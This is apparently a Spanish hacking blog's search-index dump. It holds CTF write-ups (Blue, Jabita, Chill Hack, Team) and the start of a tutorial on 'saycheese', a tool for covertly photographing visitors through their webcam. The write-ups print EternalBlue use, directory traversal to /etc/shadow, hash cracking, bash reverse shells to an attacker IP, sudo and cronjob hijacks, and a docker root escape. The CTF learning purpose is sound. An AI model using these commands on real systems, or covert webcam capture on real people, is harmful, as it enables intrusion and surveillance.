exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOST 10.10.10.40 RHOST =\u0026gt; 10.10.10.40 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.10.14.27 lhost =\u0026gt; 10.10.14.27 Lo ejecutamos\nrun Por último para spawnear una shell\nshell Flags type \\Users\\haris\\Desktop\\user.txt type \\Users\\Administrator\\Desktop\\root.tx ","date":"2023-03-13","id":40,"permalink":"/writeups/hackthebox/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.","tags":["CTF","Fácil","Windows","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-06","id":41,"permalink":"/tags/awk/","summary":"","tags":[],"title":"awk"},{"content":"","date":"2023-03-06","id":42,"permalink":"/tags/directory-traversal/","summary":"","tags":[],"title":"Directory Traversal"},{"content":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP víctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 192.168.1.141 PING 192.168.1.141 (192.168.1.141) 56(84) bytes of data. 64 bytes from 192.168.1.141: icmp_seq=1 ttl=64 time=0.257 ms --- 192.168.1.141 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.257/0.257/0.257/0.000 ms En este caso da un ttl (time to live) de 64, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.141 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 192.168.1.141 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 192.168.1.141 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 00b003d392f8a0f95a93207bf80aaada (ECDSA) |_ 256 ddb4261d0ce738c37a2f07bef8743ebc (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.52 (Ubuntu) Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Web Está corriendo una web por el puerto 80\nSegún el mensaje podemos intuir que como está en proceso de construcción no va a estar muy bien echa\nFuzzing subdirectorios Vamos a buscar subdirectorios con gobuster con el diccionario /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.141 /building (Status: 301) [Size: 317] [--\u0026gt; http://192.168.1.141/building/] Nos ha encontrado un subdirectorio\nAl entrar si nos fijamos en la url vemos como hay un \u0026lsquo;?page=archivo\u0026rsquo;\nEn este caso lo que se puede probar es si es vulnerable a directory traversal\nEfectivamente, es vulnerable, viendo el /etc/passwd podemos ver 2 usuarios\njaba jack Después de ir probando varias cosas he encontrado que podemos ver el archivo /etc/shadow\nRápidamente podemos ver que el hash de jack es un sha512 porque empieza por \u0026lsquo;$6$\u0026rsquo;, Nos lo copiamos y lo guardamos en un archivo en nuestra máquina llamado hash, después con john de ripper y el diccionario rockyou.txt vamos a intentar encontrar la contraseña\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya nos podemos conectar por ssh como jack\nEscalada de privilegios Jaba Con un sudo -l vemos que podemos ejecutar awk como jaba\njack@jabita:~$ sudo -l Matching Defaults entries for jack on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jack may run the following commands on jabita: (jaba : jaba) NOPASSWD: /usr/bin/awk Haciendo una búsqueda por la web de gtfobins encontramos que con el siguiente comando podemos escalar privilegios\nsudo -u jaba /usr/bin/awk \u0026#39;BEGIN {system(\u0026#34;/bin/bash\u0026#34;)}\u0026#39; Ya podemos ver la flag en /home/jaba/user.txt\nRoot con sudo -l vemos que podemos ejecutar un archivo de python llamado clean.py\nMatching Defaults entries for jaba on jabita: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, listpw=never User jaba may run the following commands on jabita: (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py Con un cat a /usr/bin/clean.py vemos que el progrma importa una libreria llamada wild y ejecuta la funcion first de la libreria wild\njaba@jabita:~$ cat /usr/bin/clean.py import wild wild.first() Para encontrar donde está el wild.py vamos a usar find\njaba@jabita:~$ find / -name wild.py 2\u0026gt;/dev/null /usr/lib/python3.10/wild.py Tenemos permisos de escritura\njaba@jabita:~$ ls -l /usr/lib/python3.10/wild.py -rw-r--rw- 1 root root 42 Mar 6 17:28 /usr/lib/python3.10/wild.py Vamos a modificarlo de tal forma que quede así\nimport os def first(): os.system(\u0026#34;bash\u0026#34;) Importamos la libreria os, definimos la función first y dentro de la función first ponemos que ejecute bash, como estamos ejecutando el programa como root nos va a spawnear una bash como root\njaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py root@jabita:/home/jaba# id uid=0(root) gid=0(root) groups=0(root) root@jabita:/home/jaba# Ya somos root!\nPodemos ver la flag en /root/root.txt\n","date":"2023-03-06","id":43,"permalink":"/writeups/hackmyvm/jabita/","summary":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP víctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Directory Traversal","python","awk"],"title":"Jabita"},{"content":"","date":"2023-03-06","id":44,"permalink":"/tags/linux/","summary":"","tags":[],"title":"Linux"},{"content":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.11.182 PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data. 64 bytes from 10.10.11.182: icmp_seq=1 ttl=61 time=558 ms --- 10.10.11.182 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 558.208/558.208/558.208/0.000 ms En este caso da un ttl (time to live) de 61, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.182 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.11.182 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.11.182 -oN versions Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:15 CET Nmap scan report for photobomb.htb (10.10.11.182) Host is up (0.29s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.28.215 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 09f95db918d0b23a822d6e768cc20144 (RSA) | 256 1bcf3a498b1b20b02c6aa551a88f1e62 (ECDSA) |_ 256 3005cc52c66f6504860f7241c8a439cf (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Game Info |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos FTP Lo primero que nos reporta nmap es que el usuario anonymous está permitido y hay un archivo llamado note.txt.\n$ ftp 10.10.11.182 # Nos conectamos por ftp Connected to 10.10.11.182. 220 (vsFTPd 3.0.3) Name (10.10.11.182:d3b0o): anonymous # Con el usuario anonymous 331 Please specify the password. Password: # Sin contraseña 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||8911|) 150 Here comes the directory listing. -rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt 226 Directory send OK. ftp\u0026gt; get note.txt # Nos lo pasamos a nuestra máquina local: note.txt remote: note.txt 229 Entering Extended Passive Mode (|||15616|) 150 Opening BINARY mode data connection for note.txt (90 bytes). 100% |*****************************************************************************| 90 28.28 KiB/s 00:00 ETA 226 Transfer complete. 90 bytes received in 00:00 (0.29 KiB/s) Contenido de el archivo note.txt\nAnurodh told me that there is some filtering on strings being put in the command \u0026ndash; Apaar\nDe esta nota podemos sacar 2 posibles usuarios\nApaar Anurodh HTTP Subdirectorios Para encontrar subdirectorios vamos a usar la herramienta gobuster con el siguiente comando\n$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.182/ /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.182/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.182/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.11.182/fonts/] /secret (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.182/secret/] Hay un subdirectorio que a simple vista llama la atención /secret\nAl entrar vemos que podemos ejecutar comandos.\nProbando comandos podemos ver que hay algunos que los bloquea\u0026hellip;\nIntrusión Al poner un comando válido, como por ejemplo pwd, \u0026ldquo;;\u0026rdquo; y un comando bloqueado, nos ejecuta los 2.\nDe tal forma que quedaría así: pwd;ls\nOtra opción sería poner \u0026ldquo;\\\u0026rdquo; antes del comando, porejemplo \\ls\nAhora lo que vamos a hacer es mandarnos una reverse shell desde la máquina víctima a la nuestra.\nLo primero va a ser ponerse en escucha por el puerto 443 con nc\nnc -nlvp 443 Y después vamos a mandar desde la web el siguiente comando:\n# Puerto pwd;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; # IP Atacante Recibimos la reverse shell!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.2.28.215] from (UNKNOWN) [10.10.11.182] 57032 bash: cannot set terminal process group (1022): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/secret$ Con un ip a podemos comprobar que estamos en la 10.10.11.182\nwww-data@ubuntu:/var/www/html/secret$ ip a ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9001 qdisc fq_codel state UP group default qlen 1000 link/ether 02:36:f5:10:cb:37 brd ff:ff:ff:ff:ff:ff inet 10.10.11.182/16 brd 10.10.255.255 scope global dynamic eth0 valid_lft 3363sec preferred_lft 3363sec inet6 fe80::36:f5ff:fe10:cb37/64 scope link valid_lft forever preferred_lft forever Tratamiento de la tty Antes de nada para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Apaar Con un sudo -l vemos que podemos ejecutar el archivo .helpline.sh que está en el /home/apaar/ como apaar\nwww-data@ubuntu:/var/www/html/secret$ sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh www-data@ubuntu:/var/www/html/secret$ Antes de nada vamos a ver el contenido del ese archivo\n#!/bin/bash echo echo \u0026#34;Welcome to helpdesk. Feel free to talk to anyone at any time!\u0026#34; echo read -p \u0026#34;Enter the person whom you want to talk with: \u0026#34; person read -p \u0026#34;Hello user! I am $person, Please enter your message: \u0026#34; msg $msg 2\u0026gt;/dev/null echo \u0026#34;Thank you for your precious time!\u0026#34; Es un programa muy simple, en el segundo input guarda la respuesta en una variable llamada msg y la ejecuta\u0026hellip;\nwww-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh Welcome to helpdesk. Feel free to talk to anyone at any time! Enter the person whom you want to talk with: test Hello user! I am test, Please enter your message: bash whoami apaar Para que nos salga el prompt y nos funcione el ctrl + l, etc\u0026hellip; podemos poner el siguiente comando\nscript /dev/null -c bash Anurodh mysql (rabbit hole) Para la escalada vamos a usar la herramienta https://linpeas.sh/ que es un script que automatiza el proceso de la escalada de privilegios\nPrimero nos lo pasamos a nuestra máquina\nDespués nos montamos un servidor con python por el puerto 80\nsudo python3 -m http.server 80 Desde la máquina víctima en el directorio /tmp nos pasamos el archivo.\nwget http://10.10.10.10/linpeas.sh Le damos permisos de ejecución con chmod\nchmod +x linpeas.sh Y lo ejecutamos ./linpeas.sh\nReporta que hay 2 puertos que solo son visibles desde el localhost\ntcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN Esto lo podríamos haber encontrado tambíen con:\napaar@ubuntu:/tmp$ (netstat -punta || ss --ntpu) | grep \u0026#34;127.0\u0026#34; (No info could be read for \u0026#34;-p\u0026#34;: geteuid()=1001 but you should be root.) tcp 0 0 127.0.0.1:9001 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - El puerto 3306 es el puerto predeterminado de mysql\nDentro del directorio /var/www/files hay un archivo llamado index.php en el cual hay unas credenciales para mysql\nLas cuales podemos usar para conectarnos\napaar@ubuntu:/var/www/files$ mysql -u root -p Enter password: mysql\u0026gt; Primero listamos las bases de datos\nmysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | webportal | +--------------------+ 5 rows in set (0.00 sec) Después listamos las tablas de la base de datos webportal\nmysql\u0026gt; show tables from webportal; +---------------------+ | Tables_in_webportal | +---------------------+ | users | +---------------------+ 1 row in set (0.00 sec) Por último vemos el contenido de la tabla\nmysql\u0026gt; use webportal mysql\u0026gt; select * from users; +----+-----------+----------+-----------+----------------------------------+ | id | firstname | lastname | username | password | +----+-----------+----------+-----------+----------------------------------+ | 1 | Anurodh | Acharya | Aurick | 7e53614ced3640d5de23f111806cc4fd | | 2 | Apaar | Dahal | cullapaar | 686216240e5af30df0501e53c789a649 | +----+-----------+----------+-----------+----------------------------------+ 2 rows in set (0.00 sec) Podemos ver que está el hash de dos usuarios\nCon hash-identifier buscamos que tipo es\n$ hash-identifier 7e53614ced3640d5de23f111806cc4fd Possible Hashs: [+] MD5 Vamos a guardar cada uno en un archivo (hash1, hash2) y usando john con el diccionario rockyou vamos a intentar encontrar la contraseña\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash2 Parece que era una trampa porque no sirven para nada :)\nSteganography Dentro del directorio /var/www/files hay un archivo llamado hacker.php el cual llama la atención\nDentro del hacker.php:\n\u0026lt;img src = \u0026#34;images/hacker-with-laptop_23-2147985341.jpg\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:red;\u0026#34;\u0026gt;You have reached this far. \u0026lt;/h2\u0026gt; \u0026lt;h1 style=\u0026#34;background-color:black;\u0026#34;\u0026gt;Look in the dark! You will find your answer\u0026lt;/h1\u0026gt; Hay un mensaje que dice: Has llegado muy lejos, Mira en la oscuridad y econtraras la respuesta\nArriba del mensaje hay una foto, la cual puede ser que tenga algo\nPara pasarla a nuestra máquina vamos a abrirnos un servidor con python desde la máquina víctima\npython3 -m http.server Y desde nuestra máquina nos la bajamos\nwget http://10.10.11.182:8000/hacker-with-laptop_23-2147985341.jpg Para ver si tiene algo oculto vamos a usar la herramienta steghide\nsteghide extract -sf hacker-with-laptop_23-2147985341.jpg La imagen contenia un backup.zip\nEl backup.zip está protegido con una contraseña, lo que vamos a hacer es sacarle el hash y después intentar romperlo con john mediante el diccionario rockyou.txt\nzip2john backup.zip \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash Ahora ya tenmos la contraseña y lo podemos descomprimir.\nDentro hay un php en el cual en una línea podemos ver que hay una condición con un base64\nif(base64_encode($password) == \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34;) Podemos descifrarlo con:\necho \u0026#34;IWQwbnRLbjB3bVlwQHNzdzByZA==\u0026#34; | base64 -d El resultado es la contraseña del usuario anurodh\nRoot Al hacer un id vemos que pertenecemos al grupo de docker\nanurodh@ubuntu:/var/www/files/images$ id uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker) Echando un ojo al gtfobins podemos ver que hay un comando para escalar privilegios con docker\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh Ya somos root :)\n","date":"2023-03-01","id":45,"permalink":"/writeups/tryhackme/chill-hack/","summary":"https://tryhackme.com/room/chillhack\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.11.182\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Steganography","mysql","zip2john","docker"],"title":"Chill Hack"},{"content":"","date":"2023-03-01","id":46,"permalink":"/tags/mysql/","summary":"","tags":[],"title":"mysql"},{"content":"","date":"2023-03-01","id":47,"permalink":"/tags/steganography/","summary":"","tags":[],"title":"Steganography"},{"content":"","date":"2023-03-01","id":48,"permalink":"/tags/zip2john/","summary":"","tags":[],"title":"zip2john"},{"content":"","date":"2023-02-09","id":49,"permalink":"/tags/cronjob/","summary":"","tags":[],"title":"cronjob"},{"content":"","date":"2023-02-09","id":50,"permalink":"/tags/fuzzing/","summary":"","tags":[],"title":"Fuzzing"},{"content":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n$ ping -c 1 10.10.67.245 PING 10.10.67.245 (10.10.67.245) 56(84) bytes of data. 64 bytes from 10.10.67.245: icmp_seq=1 ttl=63 time=49.5 ms --- 10.10.67.245 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 49.502/49.502/49.502/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.67.245 -oG allports Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.67.245 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p21,22,80 -sC -sV 10.10.67.245 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 795f116aa85c20824306cd488741b794d (RSA) | 256 af7e3aaf7eb4865883f1f6a254a69bbaad (ECDSA) |_ 256 2625ba07bdc3fb29437125dcd0698c79f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Whatweb Ejecutamos un whatweb para ver más información sobre la web\n$ whatweb 10.10.67.245 http://10.10.67.245 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.67.245], Title[Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;team.thm\u0026#39; to your hosts!] En el titulo pone que hay que añadir team.thm en el /etc/hosts\nWeb team.thm Reconocimiento wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://team.thm/FUZZ 000000291: 301 9 L 28 W 305 Ch \u0026#34;assets\u0026#34; 000000274: 301 9 L 28 W 306 Ch \u0026#34;scripts\u0026#34; 000000016: 301 9 L 28 W 305 Ch \u0026#34;images\u0026#34; Volvemos a hacer el escaneo sobre el directorio scripts con el diccionario SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt \u0026#34;http://team.thm/scripts/FUZZ.txt\u0026#34; 000000297: 200 21 L 71 W 597 Ch \u0026#34;script\u0026#34; Contenido del script.txt\n#!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in Al final vemos que hay una nota que dice que tuvieron que cambiar la extensión del script antiguo porque tenía CREDENCIALES\nVamos a hacer fuzzing con wfuzz usando un diccionario de extensiones.\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt \u0026#34;http://team.thm/scripts/script.FUZZ\u0026#34; 000000086: 200 21 L 71 W 597 Ch \u0026#34;txt\u0026#34; 000000053: 200 18 L 44 W 466 Ch \u0026#34;old\u0026#34; Ya tenemos la extensión del antiguo script. Si lo abrimos vemos las credenciales del usuario ftpuser\nFtp Nos conectamos por ftp como ftpuser. Dentro vemos que hay un archivo que se llama New_site.txt que nos lo podemos bajar a nuestra máquina con un get get New_site.txt para ver su contenido\nEl contenido del archivo es un mensaje dirijido de gyles a dale en el cual se dice que están empezando a programar una nueva web en un subdominio llamado dev y también dice que hay una copia del id_rsa en el archivo de configuración del ssh\nEsto lo podríamos haber encontrado antes con gobuster:\n$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u team.thm -t 50 --append-domain Found: dev.team.thm Status: 200 [Size: 187] Subdominio dev.team.thm Antes que nada es importante añadir el subdominio dev al /etc/hosts\nAl entrar a http://dev.team.thm/ vemos que hay un link a http://dev.team.thm/script.php?page=teamshare.php viendo la url podemos ver que a lo mejor podemos hacer Directory Traversal Que consiste en salir del directorio y poder ver archivos del servidor\nAl probar de ir a http://dev.team.thm/script.php?page=../../../../etc/passwd Vemos que nos muestra el /etc/passwd\nSi recordamos lo que ponía en la nota de ftp, había una parte que decía que habían puesto el id_rsa de dale en el archivo de configuración del ssh así que podemos probar de ver el archivo /etc/ssh/sshd_config\nNos lo guardamos en un archivo llamado id_rsa le damos permisos con chmod chmod 600 id_rsa, por último nos conectamos por ssh ssh -i id_rsa dale@10.10.67.245\nEscalada de privilegios Gyles Con sudo -l vemos que podemos ejecutar un archivo como gyles sin proporcionar contraseña\ndale@TEAM:~$ sudo -l User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks Si le hacemos un cat podemos ver que hay una parte en la cual se guarda un input nuestro ($error) y lo ejecuta\n#!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34; dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: test Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami gyles Ya somos gyles\n(Para que salga el prompt podemos poner script /dev/null -c bash)\nRoot En el directorio /opt/admin_stuff hay un script de root\n-rwxr--r-- 1 root root 200 Jan 17 2021 script.sh con lo siguiente:\n#!/bin/bash #I have set a cronjob to run this script every minute dev_site=\u0026#34;/usr/local/sbin/dev_backup.sh\u0026#34; main_site=\u0026#34;/usr/local/bin/main_backup.sh\u0026#34; #Back ups the sites locally $main_site $dev_site Podemos ver que ejecuta dos scripts y dice que este archivo se ejecuta cada minuto automáticamente como root\nEste archivo no lo podemos modificar pero el main_backup.sh sí.\nLo que vamos a hacer es dentro del main_backup.sh poner lo siguiente para mandarnos una reverse shell por el puerto 443\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Nos ponemos en escucha por el puerto 443 con nc y a esperar\nRecibimos la reverse shell como root!\n","date":"2023-02-09","id":51,"permalink":"/writeups/tryhackme/team/","summary":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Fuzzing","Directory Traversal","cronjob"],"title":"Team"},{"content":"¿Qué es la herramienta saycheese? La herramienta saycheese lo que hace es crear una web simple, la cual saca fotos desde la webcam de la víctima que la abre\nInstalación git clone https://github.com/hangetzzu/saycheese # Clonamos la repo de github cd saycheese # Entramos en la carpeta chmod +x saycheese # Le damos permisos de ejecución ./saycheese # Lo ejecutamos Uso / Ejemplo Al ejecutar el script saycheese lo primero que vemos es lo siguiente\nEn este caso vamos a usar ngrok.\nLo que nos permite ngrok es exponer a internet una URL, 